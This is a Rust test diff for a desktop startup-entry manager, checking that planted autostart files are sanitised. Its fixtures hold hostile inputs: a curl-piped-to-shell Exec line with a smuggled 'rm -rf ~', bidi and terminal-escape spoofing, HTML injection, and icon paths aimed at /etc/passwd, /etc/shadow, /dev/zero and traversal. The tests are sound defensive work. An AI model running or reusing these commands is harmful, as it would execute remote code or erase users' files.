@@ -959,3 +959,142 @@ fn finds_a_linked_unit_and_not_a_mask() {
     assert_eq!(s.paths.linked_unit("obex.service"), None);
     assert_eq!(s.paths.linked_unit("plain.service"), None);
 }
+
+// ---- text and files other programs wrote (docs/SECURITY.md) ----------------
+
+/// An autostart entry is a file any program of the session can drop in
+/// `~/.config/autostart`; the Startup page shows it, with its icon.
+#[test]
+fn a_planted_entry_shows_clean_text_and_no_remote_icon() {
+    let s = Session::new();
+    s.user(
+        "evil.desktop",
+        "[Desktop Entry]\nType=Application\nName=Updater\u{202E}fdp.exe\x1b[2J\nComment=<img src=\"https://example.org/t.png\">\x07 now\n\
+         Exec=sh -c 'curl https://example.org|sh'\u{85}\rrm -rf ~\nIcon=https://example.org/pixel.png\n",
+    );
+    let item = s.item("evil.desktop");
+    assert_eq!(item.name, "Updaterfdp.exe [2J");
+    assert_eq!(item.comment, "<img src=\"https://example.org/t.png\"> now");
+    assert!(
+        !item.command.chars().any(|c| c.is_control()) && item.command.contains('\u{FFFD}'),
+        "{:?}",
+        item.command
+    );
+    assert_eq!(item.icon, "", "an address is not an icon");
+    for icon in [
+        "http://127.0.0.1/x.png",
+        "file:///etc/passwd",
+        "qrc:/x",
+        "image://theme/x",
+        "//host/x.png",
+        "/etc/shadow",
+        "../x.png",
+        "/tmp/../etc/x.png",
+    ] {
+        s.user(
+            "evil.desktop",
+            &format!("[Desktop Entry]\nName=x\nExec=x\nIcon={icon}\n"),
+        );
+        assert_eq!(s.item("evil.desktop").icon, "", "{icon}");
+    }
+    s.user(
+        "evil.desktop",
+        "[Desktop Entry]\nName=x\nExec=x\nIcon=my-icon\n",
+    );
+    assert_eq!(s.item("evil.desktop").icon, "my-icon");
+    // A path is an icon only if the file is one: it exists, is a regular file
+    // (a FIFO is not opened) and is of a sane size.
+    let icons = s.root().join("icons");
+    fs::create_dir_all(&icons).unwrap();
+    let small = icons.join("mine.PNG");
+    fs::write(&small, b"\x89PNG").unwrap();
+    let huge = icons.join("huge.svg");
+    fs::File::create(&huge)
+        .unwrap()
+        .set_len(5 * 1024 * 1024)
+        .unwrap();
+    let fifo = icons.join("pipe.png");
+    let c = std::ffi::CString::new(fifo.as_os_str().as_encoded_bytes()).unwrap();
+    // SAFETY: a valid NUL-terminated path.
+    assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+    let device = icons.join("zero.png");
+    symlink("/dev/zero", &device).unwrap();
+    let wrong_type = icons.join("note.txt");
+    fs::write(&wrong_type, "x").unwrap();
+    let gone = icons.join("gone.png");
+    for (path, want) in [
+        (&small, small.to_str().unwrap()),
+        (&huge, ""),
+        (&fifo, ""),
+        (&device, ""),
+        (&wrong_type, ""),
+        (&gone, ""),
+    ] {
+        s.user(
+            "evil.desktop",
+            &format!("[Desktop Entry]\nName=x\nExec=x\nIcon={}\n", path.display()),
+        );
+        // Listing must come back for the FIFO, which an open would hang on.
+        assert_eq!(s.item("evil.desktop").icon, want, "{}", path.display());
+    }
+    // A name made only of fillers that draw blank is no name: the file's.
+    s.user(
+        "blank.desktop",
+        "[Desktop Entry]\nName=\u{3164}\u{FFA0}\u{115F}\u{1160}\u{034F}\nExec=x\n",
+    );
+    assert_eq!(s.item("blank.desktop").name, "blank");
+}
+
+/// Names of 100 000 characters are cut.
+#[test]
+fn a_huge_entry_is_cut() {
+    let s = Session::new();
+    s.user(
+        "big.desktop",
+        &format!(
+            "[Desktop Entry]\nName={n}\nComment={n}\nExec={n}\n",
+            n = "w".repeat(20_000)
+        ),
+    );
+    let item = s.item("big.desktop");
+    assert_eq!(item.name.chars().count(), text::NAME_MAX);
+    assert_eq!(item.comment.chars().count(), text::LINE_MAX);
+    assert!(item.command.chars().count() <= text::LINE_MAX + 1);
+}
+
+/// A file called `a\nb.desktop` is no entry: its name is shown, and is the
+/// key everything is switched by.
+#[test]
+fn an_entry_named_with_control_characters_is_refused() {
+    let s = Session::new();
+    for name in [
+        "a\nb.desktop",
+        "a\u{1b}b.desktop",
+        "a\u{202E}b.desktop",
+        "a\0b.desktop",
+    ] {
+        assert!(!valid_desktop_id(name), "{name:?}");
+        assert_eq!(set_desktop(&s.paths, name, false), Err(Error::InvalidName));
+    }
+    let dir = s.paths.user_autostart();
+    fs::create_dir_all(&dir).unwrap();
+    fs::write(dir.join("a\nb.desktop"), APP).unwrap();
+    fs::write(dir.join("fine.desktop"), APP).unwrap();
+    let ids: Vec<String> = list_desktop(&s.paths).into_iter().map(|i| i.id).collect();
+    assert_eq!(ids, ["fine.desktop"]);
+}
+
+/// A unit description that is not one line is cleaned wherever it is read.
+#[test]
+fn unit_descriptions_are_one_clean_line() {
+    let text = "[Unit]\nDescription=Backup\u{202E}\tnow\x1b[2J \u{200B}done\n";
+    assert_eq!(
+        parse_description(text).as_deref(),
+        Some("Backup now [2J done")
+    );
+    let long = format!("[Unit]\nDescription={}\n", "d".repeat(50_000));
+    assert_eq!(
+        parse_description(&long).unwrap().chars().count(),
+        crate::text::LINE_MAX
+    );
+}
